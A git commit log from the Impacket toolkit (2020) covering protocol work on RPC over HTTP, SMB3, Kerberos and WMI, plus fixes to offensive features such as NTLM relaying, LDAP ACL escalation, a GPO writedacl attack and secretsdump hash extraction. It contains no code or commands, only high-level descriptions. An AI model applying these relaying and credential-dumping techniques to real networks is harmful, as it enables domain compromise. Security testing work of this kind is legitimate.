Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 30 15:44:18 2020 +0300

    Final changes for exchanger.py

commit e59ff693873e4478ba196b683a7a126998bce90b
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Wed Jul 29 11:44:22 2020 -0400

    httpRelayServer: read body content for POST requests
    
    Web clients receiving a 401 Unauthorized header as a response, depending
    on the Keep-alive header, may authenticate inside the same TCP stream,
    or close the first one and open another.
    In the first case, if the client was sending a POST request with data in
    the content body, the content body was parsed by handle_one_request()
    as a new (invalid) request, thus causing an issue with the parsing of the following
    request where the Authorization header was actually presented.

commit 48a3124c43d2242d6a336796cb50855ba93b23b2
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 28 23:01:51 2020 -0300

    Enforce RPC_C_AUTHN_GSS_NEGOTIATE when using Kerberos.
    
    Should help on https://github.com/SecureAuthCorp/impacket/pull/739#issuecomment-665363963

commit f89b49e2f5eeacac3a7448f960d360debfc11baa
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 28 22:13:21 2020 -0300

    Fail gracefully if we can't get the LSA values we need
    
    Should make it easier to spot https://github.com/SecureAuthCorp/impacket/issues/908

commit 39ef03811344113ef36ab8fe7dd999cb0d0cac21
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 28 21:23:19 2020 -0300

    Adding -no-pass, pass-the-hash and AES Key support for backup subcommand
    
    Addresses https://github.com/SecureAuthCorp/impacket/issues/804

commit 7786ba017071c68191dffd4b432c001e147d5e25
Merge: 23510be8 b39690fe
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 28 18:29:11 2020 -0300

    Merge pull request #859 from mohemiv/ndr
    
    NDR Parser Optimization

commit 23510be8d2ff26e70a3568fcb1033b15c247ddda
Merge: 1e84ad60 ff653829
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 28 13:50:05 2020 -0300

    Merge pull request #907 from 0xdeaddood/master
    
    Fix decryptHash for not VistaStyle hashes

commit ff6538297f88d00962f4bd44964943359a39b0ec
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Jul 28 12:11:58 2020 -0300

    Fix decryptHash for not VistaStyle hashes

commit 28098805b8f1fa76913ae2bc103991af5d0e2dde
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 23 11:46:17 2020 +0300

    Adding exchanger.py

commit f95712a3f3df07234642b8d2e1d83639d5b592e6
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 19 21:31:36 2020 +0300

    Adding new protocols to RPC UUIDs database

commit 9a678ee759a17a78da963ea215ef4947ca65410a
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Fri Jul 17 20:25:05 2020 +0300

    Bugfixing MS-RPCH

commit 1e84ad6049197ee15d31dc077c25415f90a61683
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 13 10:09:28 2020 -0300

    Setting plainText variable to b'' for not VistaStyle hashes.
    
    Shoud address https://github.com/SecureAuthCorp/impacket/issues/902

commit 8e387f99c3fd3e9dedaa2e773d9c95116878e3f4
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Jul 13 02:29:33 2020 +0300

    Update transport.py
    
    This is better than swapping TCPTransport and RPCProxyClient

commit 87cd317548e31a63e979930e70b7b8de734c8f43
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Jul 13 01:37:42 2020 +0300

    Added a description about ACLs to MS-RPCH impl

commit 2208853a3b281c6f4db5f779adbad828d956f3dd
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Jul 13 00:22:03 2020 +0300

    Added parse_bitmask function to structure.py
    
    In the future we can add a parameter to get a wireshark formatted output

commit 1639b2fe92044616d85c2f6d8ad9fdc369a5d642
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Sun Jul 12 23:34:32 2020 +0300

    Update README.md

commit 84d579d4b9cf5ff878e70c0c82f3c88b31d4cc9c
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 23:29:43 2020 +0300

    Added missing import to rpcmap.py

commit c8a3be3d72546c7bc69d736226deea00f6d06d34
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 22:30:02 2020 +0300

    Changing -auth-rpcproxy function to -auth-transport in rpcmap.py and modifying the code to suit the new MS-RPCH impl
    
    + Now it's possible to specify different credentials for SMB and RPC
    + RPC Proxy errors are handled by constants from its implementation
    
    The downside of this commit is it removes Kerberos support.
    
    Current SMB and RPC libraries depend too much on each other,
    we need to make some changes for them to get an ability to use different credentials and
    different security providers on both levels, and add a support to make reconenctions with
    proper socket handeling, and saving security configuration.
    
    Probably removing Kerberos is not a big deal, as rpcmap.py is usually used in research purposes.

commit c930648390509a622082a10253b3fcb0a39d8d47
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:57:21 2020 +0300

    Added important TODO to rpcmap.py
    
    For now rpcmap.py leaves a lot of socket after itself, and
    to get it work the correct way without stupid workarounds it
    will require change some code in the library

commit 1eabde7b67509c610aec8fd36dda53f17854edcd
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:51:37 2020 +0300

    Added -brute-versions function to rpcmap.py

commit dca83b487beb037e0a616279ae3b358a4b127250
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:32:17 2020 +0300

    Fixing a bug in rpcmap.py
    There was no way to bruteforce UUIDs on ncacn_ip_tcp endpoints with empty credentials because of the lockout protection

commit ca9236f148ed7b26139506562a8ad24403e47cf0
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 20:11:23 2020 +0300

    Changing rpcdump.py to suit a new MS-RPCH impl

commit 65581403841013ee88b36aa89e32053a57fad0ee
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Jul 12 17:41:24 2020 +0300

    Huge update of MS-RPCH implementation
    
    + Bug fixing
    + Added Basic authentication support
    + Added RPC over HTTP v2 Flow control support
    + Removed all the code that relied on TCP layer to determine HTTP boundaries
    + Added support for UTF-8 server erros
    + Security stuff moved to a different file
    + Tested on 20+ different targets

commit 865f4e0396ef6057ccb515f297141ea44284dc22
Author: 001 <001@sopranos.net>
Date:   Sun Jul 12 14:40:41 2020 +0300

    Fixed dcomrt.py MinorVersion Problem

commit 7e8a0d008d4c88d4e7dddb55f9e31ac8150fcba9
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:54:15 2020 +0300

    Adding MS-NSPI / MS-OXNSPI implementation

commit 01235be574abf317d874dff6b650205f2277a5ce
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:50:26 2020 +0300

    Adding support of a new UUID format to uuid.py

commit e92f49b6684ca3a9f06629dbb7e6aa5f4ddfb373
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:40:41 2020 +0300

    Small name changing in MS-OXABREF

commit 3546a3ee2b1f9df7705af1a00bf85e10a38396b4
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:38:32 2020 +0300

    Adding NSPI / OXNSPI / MAPI errors and constants

commit feb0589049bb80283fe7303a20772b456e33eb74
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:35:05 2020 +0300

    Adding MS-OXABREF implementation

commit 98d231e1215de3b8b8b36b2815f60d83321d3a88
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:26:16 2020 +0300

    Adding new structures and helpers to MS-RPCH impl

commit a815da67c93e3a89a2e4315216fbacd9b616b2f3
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:16:27 2020 +0300

    Adding handling of rare RPC Proxy errors to MS-RPCH impl
    
    For now I'm adding the code to check nt_errors.py, but I didn't see RPC Proxies returning any errors from this file except those we added in the previous commit.

commit b0449870bb6e1e20164e911a7fe7e1f2a5dc621d
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jul 10 19:14:46 2020 +0300

    Adding rare RPC Proxy errors to nt_errors.py

commit c79997ec3e8286b078d211d7dcb2ee2f5e6ef6ec
Merge: 5d4ad6cc b39690fe
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Tue Jul 7 20:50:11 2020 +0300

    Merge pull request #1 from mohemiv/ndr
    
    Optimizing NDR parser to work with large-sized RPC results

commit 679d90cffeed2cfd91cd5c9c233f31b39e6a7d4e
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Tue Jul 7 11:48:22 2020 -0400

    ldapattack: fix error when trying to escalate with machine account
    
    When relaying to ldap/ldaps and trying to escalate with a machine
    account, the machine account is found by getUserInfo() but not by
    aclAttack(). aclAttack assumes that the objectCategory=user which
    machine accounts are not. By being a little more generic,
    objectClass=user will allow to use both categories of objects.

commit 5d4ad6cc26496f6e16e7ec6ab54b631ea98b09c5
Merge: b5c0f175 6faf51d7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jun 29 14:53:57 2020 -0300

    Merge pull request #891 from mubix/patch-2
    
    Fix for #888 Part 1

commit b5c0f175301335cd05580b67bd0e66b6bb61f8ba
Merge: 5db5e4fa 1bb9e504
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jun 29 14:53:34 2020 -0300

    Merge pull request #892 from mubix/patch-3
    
    Fix for #888 Part 2

commit 1bb9e504bba17319980b08614f9c6e6015dd4420
Author: Rob Fuller <mubix@users.noreply.github.com>
Date:   Mon Jun 29 12:27:51 2020 -0400

    Fix for #888 Part 2

commit 6faf51d7a8fc5cf546b7fa41af1e33161a88bf4a
Author: Rob Fuller <mubix@users.noreply.github.com>
Date:   Mon Jun 29 12:25:29 2020 -0400

    Fix for #888 Part 1

commit 5db5e4facc4795584ac0dcab630d4f6fd196387b
Merge: 560dade4 7f68662d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jun 24 11:52:40 2020 -0300

    Merge pull request #887 from AaronRobson/issue/#886
    
    fix #886 remove overridden IdentifierAuthority key in RPC_SID.fromCan…

commit 560dade42472f9e14a539a06cfe7d26e7e53a61f
Merge: 760cb1ea ef67d7af
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jun 24 11:37:40 2020 -0300

    Merge pull request #828 from mpgn/master
    
    Fix warning with python3.8

commit 7f68662d48c2b59c658a6cfca3ec8c787dfc0ef4
Author: Aaron Robson <aaron.robson@citrix.com>
Date:   Thu Jun 18 11:32:40 2020 +0100

    fix #886 remove overridden IdentifierAuthority key in RPC_SID.fromCanonical

commit be64aa2899485502e9510b5d82b1c4cf3ab5b096
Author: Спиненко Иван ispinenko@ussc.ru <ispinenko@ussc.ru>
Date:   Wed Jun 17 12:10:36 2020 +0500

    dcerpc: replace default readFlags to EVENTLOG_SEEK_READ #882

commit 760cb1ea3e002c2d0d650b8b05050386735ccfd4
Merge: f4558a10 8a6853c4
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jun 11 11:16:21 2020 -0300

    Merge pull request #880 from Romounet/kerberos
    
    Kerberos authentication for smb2

commit f4558a10e24bf51fd6410d5c0f80fa087da2e8c4
Merge: b5c61678 5bdc1cb6
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jun 10 17:42:08 2020 -0300

    Merge pull request #873 from IllusiveNetworks-Labs/feature/add_wmi_array_serialization
    
    Improve serialization of wmi method parameters

commit 8a6853c4f5274293798c5e54bbe65735638f6d1e
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Thu May 14 14:36:33 2020 -0400

    smb3: store Connection.PreAuthIntegrityHashValue
    
    Only the Session.PreAuthIntegrityHashValue is computed and stored.
    
    As described in [MS-SMB2] a Connection.PreAuthIntegrityHashValue must be
    computed and used to initialize the Session.PreAuthIntegrityHashValue
    for all successive sessions.
    This is important in the case of the SMBv3.1.1 dialect as it will allow
    to obtain different signing keys for each session.

commit f164be0f1e2d0a293435a27637a4080339370c3b
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Thu May 14 11:17:39 2020 -0400

    smb3: Handle mutual auth option for kerberos authentication
    
    When authenticating with kerberos, the mutualAuth option can be
    specified to GSS-API. The option is sent in the AP_REQ message.
    When this is the case, the applicative session key must be retrieved
    from the AP_REP.

commit 23fedb7389c0e36ab7b2c20dcafa758e01db6353
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Mon Apr 27 17:23:53 2020 -0400

    kerberosv5: return sessionKey with right cipher type in getKerberosTGT
    
    The cipher type of the session key returned by getKerberosTGT is guessed
    upon the cipher type used for encryption of the AS_REP. This may be
    inaccurate and cipher types may be different. It is better to
    return the right cipher type indicated in the deciphered AS_REP.

commit 5bdc1cb6145ad49745b47ce4cc551a12d202d94b
Author: shmul <tshamul@illusivenetworks.com>
Date:   Thu May 21 23:52:02 2020 +0300

    Add serialization of array as input parameter for method call

commit ab75edb9dc95de31cd4cfd2aba0af3c3cbdfd65e
Author: shmul <tshamul@illusivenetworks.com>
Date:   Thu May 21 10:10:38 2020 +0300

    Add handling with WMI object method parameters (in array and regular)

commit 96bef0a3720d03282595eecebf1b73b39034af7e
Author: shmul <tshamul@illusivenetworks.com>
Date:   Tue May 19 23:12:04 2020 +0300

    Add implementation of serialization of string array in method in parameters

commit b5c61678c9ad33629667cbbf35186cf42602b67d
Merge: 874d7ae4 fc466d16
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Jun 7 10:01:19 2020 -0300

    Merge pull request #870 from IllusiveNetworks-Labs/feature/issue_787_fix_put_instace_ndtable
    
    Issue 787 - Fix marshaling wmi object's ndTable and handling of defau…

commit 874d7ae4df8551c4fc5095a1e3b7ee5969c6057b
Merge: fe40cb04 5ac17fe3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Jun 5 13:39:09 2020 -0300

    Merge pull request #871 from mohemiv/patch-1
    
    Adding missing checkNullString call to hSchRpcStop

commit 5ac17fe3b4450006b3f3514344e4e8e8ed016521
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Fri Jun 5 00:00:51 2020 +0300

    Adding missing checkNullString call to hSchRpcStop

commit fc466d16308797f7f59be92e294b02209156ceea
Author: shmul <tshamul@illusivenetworks.com>
Date:   Tue May 19 09:19:43 2020 +0300

    Issue 787 - Fix marshaling wmi object's ndTable and handling of default uint/bool values

commit fe40cb04483dab305f17c29d71db928ac7eb5cf7
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 3 15:29:56 2020 -0300

    Adding disclaimer section, clarifying the spirit of this initiative.

commit 3f1e7ddd0c6e39f0445b8f86870a0194416e6695
Merge: 525fa3d0 b5b9ca81
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 20 12:05:26 2020 -0300

    Merge pull request #857 from mohemiv/master
    
    Added Relaying to RPC support

commit 525fa3d08cc6f274bbfaeafad861dde3e5bd917a
Merge: 9a4b3f52 ee61f9d3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon May 18 09:20:28 2020 -0300

    Merge pull request #858 from fuzzKitty/master
    
    Fixed missing byte literal and deprecated getheader

commit ee61f9d349106d1c05959dfd579a3b883027a690
Author: fuzzKitty <shlomo@fuzzkitty.com>
Date:   Mon May 18 14:33:09 2020 +0300

    Added python2 support
    
    Added python2 support

commit 8ac3c66a2b14388169b9ad07a599e568ff8a8077
Author: fuzzKitty <shlomo@fuzzkitty.com>
Date:   Mon May 18 13:00:12 2020 +0300

    Replaced deprecated getheader() with get()
    
    Replaced deprecated getheader() with get()

commit b39690fe84090127fcde1bb09e7eb07f10d46f81
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 04:49:08 2020 +0300

    NDR Parser Optimization Bug Fixing

commit 1e8fc7cc1fb5bf25c4a2d4a3b69420828007ae79
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 04:32:56 2020 +0300

    NDR Parser Optimization Bug Fixing

commit f5fdbc67ab43b801c992e69fa3e910f16f0dd05a
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 04:32:01 2020 +0300

    NDR Parser Optimization Bug Fixing

commit 29a525fda79ebc2365d1e1f2c71b2f3d3fe4068e
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon May 18 03:39:26 2020 +0300

    NDR Parser Optimization

commit 8a6e9e2c4947cbc47f1346cc290ca53d92bab71c
Author: fuzzKitty <shlomo@fuzzkitty.com>
Date:   Sun May 17 10:09:44 2020 +0300

    Fixed missing byte literal
    
    Missing byte literal string annotation added.

commit b5b9ca817b6a1238edfab98784062e4a38090f79
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri May 15 04:27:26 2020 +0300

    Added Reaying to RPC support

commit 9a4b3f5267d91ba8bfd55b8e00390916cd154bbd
Merge: 96c7a512 6c2b061a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed May 13 10:14:03 2020 -0300

    Merge pull request #855 from rmaksimov/fix-kerberos-in-getnpusers
    
    fix #809

commit 6c2b061a659d575eda01cea554c6329fe40a9b41
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed May 13 14:42:22 2020 +0300

    fix #809 issue with Kerberos in GetNPUsers.py

commit cfe14a87419280eb0d9714ec013a55dae2a0ca9e
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Apr 27 03:50:04 2020 +0300

    fix string formatting

commit db2b13e0c9768b2704b1064c109391de67bd2d65
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Apr 27 03:30:14 2020 +0300

    add -dc-host option

commit 96c7a5124f26666a1d55b7c282cb944cd1672663
Merge: c44901d1 a1d2b978
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Apr 28 19:12:54 2020 -0300

    Merge pull request #840 from ThePirateWhoSmellsOfSunflowers/fix_pagedresults_control
    
    fix the ldap search with paged results

commit a1d2b978a7dc986d4a6c17a17f9ec170b2e298af
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Mon Apr 27 21:36:33 2020 +0200

    fix the comparison for paged results

commit 5d75530d1b82ab3d0c58a88feeb298ec8e7751ff
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Apr 27 02:48:58 2020 +0300

    add SMB timeout handling

commit c44901d14f19e444fa19a8c23481f94686062a0f
Merge: 23bbfbe1 9f69ffaa
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 24 15:05:28 2020 -0300

    Merge pull request #835 from 0xdeaddood/NTLMrelay_fixes
    
    Ntlmrelay.px fixes

commit 9f69ffaa90693998acb133b5be6173aad13b4f62
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Apr 24 12:50:42 2020 -0300

    Fix relaying over new Windows versions
    Windows 10, version 1709, Windows 10, version 1903, Windows Server,
    version 1709, Windows Server, version 1903, and later versions of
    Windows, have Guest access in SMB2 disabled by default. This commit adds
    a trick to avoid this restriction.

commit f7c09637b763f7a51ce8e2c7f21d6af12bbb5713
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Apr 24 12:42:42 2020 -0300

    Fix errors relaying to LDAP
    Some exploitations or techniques that activate the NTLMrelay, like
    printerbug.py, have special behaviors that affect the correct functioning
    of LDAP attacks. This commit fix an issue related to those incoming
    connections.

commit 23bbfbe112f80e46eba87ea2cc9d6ea1083a08e0
Merge: 62162e0a a682d821
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 22:33:59 2020 -0300

    Merge branch 'Romounet-smbserverCreds'

commit a682d8213a593b3b674736e359730ffd3f48841c
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 22:32:53 2020 -0300

    Lower casing the username when the creds file directly provided thru the config file.
    
    Related to https://github.com/SecureAuthCorp/impacket/pull/833

commit 006f6e981ef4f76f831650df4eb19d7796321d01
Author: Romain Carnus <romain.carnus@gmail.com>
Date:   Wed Apr 22 18:30:39 2020 -0400

    smbserver.py: check case insensitive NTLM username
    
    Windows usernames are case insensitive. In smbserver credentials are
    stored in the server in the exact manner they are provided by the user and fetched
    using the username provided in the AUTH message as the key of the
    dictionnary. If there is a difference in the case, credentials are not
    found and the authentication fails.

commit ef67d7aff09ac646479f477da3c24d2463cb6b72
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Mon Apr 20 13:18:23 2020 -0400

    Fix warning with python3.8
    
    https://docs.python.org/3.8/whatsnew/3.8.html#changes-in-python-behavior
    
    > The compiler now produces a SyntaxWarning when identity checks (is and is not) are used with certain types of literals (e.g. strings, numbers). These can often work by accident in CPython, but are not guaranteed by the language spec. The warning advises users to use equality tests (== and !=) instead. (Contributed by Serhiy Storchaka in bpo-34850.)

commit 62162e0a1e0b55186ad0517e5b37532a06d9b70c
Merge: 7e505892 1556afa0
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 16 09:18:38 2020 -0300

    Merge branch 'mohemiv-master'

commit 1556afa08b69281817c4152bb09ab6368f11a809
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Wed Apr 15 17:26:21 2020 +0300

    Added support for one of non-standard IIS configuration seen in the wild

commit 49c9312413e6e031a0f70488d4ab534f70a1acab
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Apr 14 01:24:44 2020 +0300

    Small bug fixing related to RPC over HTTP v2 changes

commit 3506a6073690345be36e5a8bd843dd2b0a991faa
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 08:58:17 2020 +0300

    Fixing Travis CI tests after adding RPC over HTTP v2 realization

commit b59bcfaad39f99855987790feacb73d6bcbc33bc
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 08:41:55 2020 +0300

    Changing HTTPTransport::connect method to "more right"

commit 9f6c9137250f75a5980379bfff94f4dc4c4a101f
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 08:10:59 2020 +0300

    Removing non-working code from lookupsid.py

commit abb991572dadd3b5aaedfb3ccba86239355e7628
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:33:52 2020 +0300

    Normalizing [domain/]user[:password] regexps to the right one

commit 96b522884f31f68cfff6cda24c2c30827b3b35e8
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:19:20 2020 +0300

    Rewriting opdump.py and ifmap.py to rpcmap.py

commit 3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:12:40 2020 +0300

    Added missing MSRPC_RTS const

commit a7f470b85e86b8acfbfd4cbbd61bfc218c8187b1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:09:26 2020 +0300

    Added RPC over HTTP v2 support for rpcdump.py

commit e9d7781e97d7b0ae332423fdfab77a58a4faa3c3
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 07:05:07 2020 +0300

    Added RPC over HTTP v2 protocol

commit 070a4a8a0d98f05aa797a9349be6be67af1f2e0d
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:53:18 2020 +0300

    Removing misleading code from endpoint mapper client realization
    rpctransport.getRemoteName() could be anything that user specified

commit 5f7ac5c9d7f78742f7a43dd797d9d4f6f5db4b86
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:10:00 2020 +0300

    Added support for getting more than 499 endpoints from endpoint mapper

commit e3871f2278180a19411a143965de0ca9886332bb
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:03:03 2020 +0300

    Added EMPTY_UUID to uuid.py

commit f15c44deb9073bc09cbdd7939bc4f25befd5ebef
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 06:00:55 2020 +0300

    Small changes in epm.py KNOWN_PROTOCOLS

commit 5ff60a439822e38d711baac3725b3abf1e58da72
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 05:57:20 2020 +0300

    Fixing mistakes related to context_handle_uuid and extending its capabilities

commit bfd42202b43d4fbe8c62c41be2e93273e296e184
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 05:46:41 2020 +0300

    Added stringbinding support for DCERPCTransport

commit c55d629185662d8747b8ae7c38f15f440f09d859
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Apr 2 05:36:26 2020 +0300

    Extending DCERPCStringBinding capabilities

commit 7e50589280b07ce6814adf97a0492917dc5a6620
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 27 10:38:53 2020 -0300

    And going back to dev version :)

commit 039087dd05ac9ae180360b1559957164a30d9bf6
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 26 15:33:51 2020 -0300

    Updating source tag

commit 5ead52979633653848b3507f9318c54c7e50496e
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 26 15:28:31 2020 -0300

    About to tag release

commit edcc564dd280c6d5d5564d756bd3e2c781907875
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 26 15:26:21 2020 -0300

    About to tag release

commit 69fee03fd8c120ec7ed0b1e630f7dcc5780fa3f9
Merge: 9e953679 496d3c82
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 25 17:10:15 2020 -0300

    Merge pull request #802 from 0xdeaddood/SAM_dump
    
    Add error handling for hashes extraction in secretsdump.py

commit 9e953679efa81f88a71666f60bb2eb303756b153
Merge: 0056b61c 156f82ca
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 25 16:17:48 2020 -0300

    Merge pull request #803 from 0xdeaddood/LDAP_shell_errors
    
    Add detailed error messages to the ldap_shell.py

commit 156f82caf7c8910a791990f75557c65648454fb7
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Mar 20 16:08:35 2020 -0300

    Add detailed error messages to the ldap_shell.py
    Add some minor changes

commit 496d3c82a5fcee53cf105ce63000e52dd89e067a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 18 21:20:10 2020 -0300

    Add error handling for hashes extraction in secretsdump
    After the Fall Creators Update (version 1709), Windows installations
    present a special account named WDAGUtilityAccount. This account is
    part of the Windows Defender Application Guard and is often disabled.
    In Windows Server 2019, this account, when WDAG is disabled, doesn't
    have hash information. For this reason, when secretsdump.py is
    processing the account, the local SAM hashes extraction fails.
    This PR adds error handling for accounts that for some reason don't have
    hash information.

commit 0056b61ca52e13acf05d101518976980f1592d85
Merge: 8afe4fe1 3e184044
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Mar 13 16:05:19 2020 -0300

    Merge pull request #792 from themaks/patch-1
    
    Change padding between negotiate contexts

commit 3e184044c567042268a9b06fef4fbb7c471862b9
Author: Maxime Meignan <meignanmaxime@hotmail.fr>
Date:   Fri Mar 13 10:36:53 2020 +0100

    Change padding between negotiate contexts
    
    Since `Subsequent negotiate contexts MUST appear at the first 8-byte aligned offset following the previous negotiate context`, when a negotiate context's end is already 8-byte aligned, padding should be 0 and not 8.

commit 8afe4fe1044dc47faae25d2f3ad6e61217cc5898
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 12 23:57:21 2020 -0300

    Adding SMB 3.1.1 support for Client SMB Connections
    
    - Clients do not advertise this version by default (not sure if we want to yet) so you will need to explicity set the `preferredDialect` to `SMB2_DIALECT_311` when creating a `SMBConnection` instance.
    - PreAuthIntegrity and Encryption Capabilities supported: The NegotiateContexts will be created accordingly in the `SMB2_NEGOTIATE` packet. You can enfore encryption uncommenting a line when the contexts are created. I found the server supports encryption even if they don't advertise it.
    - Signing, Application, Encryption and Decryption keys are now calculated different depending on the SMB3 version specified.
    - Compression is not yet supported, but the structures are all there (`SMB2_COMPRESSION_CAPABILITIES`,`SMB2_COMPRESSION_TRANSFORM_HEADER`, `SMB2_COMPRESSION_PAYLOAD_HEADER`, `SMB2_COMPRESSION_PATTERN_PAYLOAD_V1`) for playi
    ng at will :)

commit 0b46f198042626a1ecd2846d22db355453e29c03
Merge: 9d4a9116 896f78df
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 9 13:41:59 2020 -0300

    Merge pull request #786 from rmaksimov/ntlmrelayx-and-byte-strings-fixes
    
    Ntlmrelayx and byte strings fixes

commit 9d4a911686f9ae91c50154f529b123a108725d73
Merge: 470024fc fe305dbf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 9 11:13:54 2020 -0300

    Merge pull request #772 from fridgehead/ldapfun
    
    Added GPO writedacl attack to ldapshell

commit 470024fcea41c13d5a691cd6ea705467c5d31b48
Merge: e0c1b9dd dbbfc78c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 9 10:18:11 2020 -0300

    Merge pull request #785 from MarioVilas/patch-1
    
    Fixed crash on Wine when Git was not installed

commit 896f78df183a0b1e73f0ff9c5324e584f6bea3f7
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Mar 8 02:05:47 2020 +0300

    convert UTF-8 to lowercase

commit 865e27e0da10a0f7120baf8f61070848b9c6f83f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Mar 8 01:53:42 2020 +0300

    fix decoding of byte-strings

commit 202aab422fc29e04b5b4be308586aacacbbb86bf
